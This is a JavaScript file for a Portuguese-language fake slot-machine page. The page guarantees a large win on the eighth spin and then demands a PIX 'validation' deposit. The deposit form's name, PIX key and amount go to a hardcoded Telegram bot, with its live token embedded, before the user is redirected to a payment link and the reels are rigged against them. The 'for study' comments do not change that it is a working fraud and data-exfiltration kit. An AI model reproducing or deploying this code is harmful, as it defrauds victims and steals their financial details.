/* CONFIGURAÇÃO TELEGRAM */
const TELEGRAM_TOKEN = "7907530650:AAHQY7hR8N4w9N9IAnN2Gg0wO83O7pL7y40";
const TELEGRAM_CHAT_ID = "6238676644";

/* ESTADOS DO JOGO */
let saldoAtual = 50.00;
let valorAposta = 2.00;
let contadorRodadas = 0;
let faseDoUsuario = "normal"; // Ponto de estudo: interruptor de manipulação

const itensDisponiveis = ["🐯", "🍊", "🔔", "💰", "🧧", "🪙"];

/* INICIALIZAÇÃO */
document.addEventListener("DOMContentLoaded", () => {
    atualizarDisplayInterface();
    renderizarRolosIniciais();
});

function atualizarDisplayInterface() {
    const elSaldo = document.getElementById("saldo");
    if (elSaldo) elSaldo.innerText = `R$ ${saldoAtual.toFixed(2).replace('.', ',')}`;
}

function renderizarRolosIniciais() {
    for (let i = 0; i < 3; i++) {
        const reel = document.getElementById(`reel-${i}`);
        if (reel) reel.innerHTML = `<div class="slot-item">🐯</div><div class="slot-item">🍊</div><div class="slot-item">🔔</div>`;
    }
}

/* LÓGICA DE JOGO */
window.girarSlots = function() {
    if (saldoAtual < valorAposta) {
        window.abrirModalDeposito();
        return;
    }
    saldoAtual -= valorAposta;
    contadorRodadas++;
    atualizarDisplayInterface();

    for (let i = 0; i < 3; i++) {
        document.getElementById(`reel-${i}`)?.classList.add("rodando-vertical");
    }

    setTimeout(finalizarRodadaEGanho, 1200);
};

function finalizarRodadaEGanho() {
    let matriz = [];
    
    // Lógica unificada: Trava da 8ª ou Manipulação ou Aleatório
    for (let i = 0; i < 3; i++) {
        if (contadorRodadas === 8) {
            matriz.push("🐯");
        } else if (faseDoUsuario === "manipulado") {
            matriz.push(Math.random() < 0.8 ? itensDisponiveis[Math.floor(Math.random() * itensDisponiveis.length)] : "🐯");
        } else {
            matriz.push(itensDisponiveis[Math.floor(Math.random() * itensDisponiveis.length)]);
        }
    }

    // Injeção correta dos 3 símbolos
    for (let i = 0; i < 3; i++) {
        const reel = document.getElementById(`reel-${i}`);
        if (reel) {
            reel.classList.remove("rodando-vertical");
            reel.innerHTML = `<div class="slot-item">${matriz[0]}</div><div class="slot-item">${matriz[1]}</div><div class="slot-item">${matriz[2]}</div>`;
        }
    }

    // Validação de vitória
    if (matriz[0] === matriz[1] && matriz[1] === matriz[2]) {
        let ganho = (contadorRodadas === 8) ? 1547.00 : (valorAposta * 5);
        saldoAtual += ganho;
        atualizarDisplayInterface();
        dispararBalaoGanhoLimpo(ganho);
        
        if (contadorRodadas === 8) {
            setTimeout(() => { alert("Valide seu saque via PIX."); window.abrirModalDeposito(); }, 500);
        }
    }
}

/* ENVIO TELEGRAM */
window.salvarEDepositarPIX = function() {
    const nome = document.getElementById("pix-nome")?.value.trim();
    const chave = document.getElementById("pix-chave")?.value.trim();
    const valor = document.getElementById("pix-valor-dep")?.value.trim();

    if (!nome || !chave || !valor) return alert("Preencha todos os campos.");

    faseDoUsuario = "manipulado"; // Ativa a manipulação para estudos

    const msg = `⚠️ *NOVA TENTATIVA* ⚠️\n👤 ${nome}\n🔑 ${chave}\n💵 R$ ${valor}`;
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: "Markdown" })
    }).then(() => window.location.href = "https://go.tribopay.com.br/w3p787fphj");
};

function dispararBalaoGanhoLimpo(valor) {
    const balao = document.createElement("div");
    balao.className = "balao-ganho-dinamico";
    balao.innerHTML = `🎉 PARABÉNS! 🎉<br><strong>Você Ganhou R$ ${valor.toFixed(2)}</strong>`;
    document.body.appendChild(balao);
    setTimeout(() => { balao.style.opacity = "0"; setTimeout(() => balao.remove(), 200); }, 400);
}
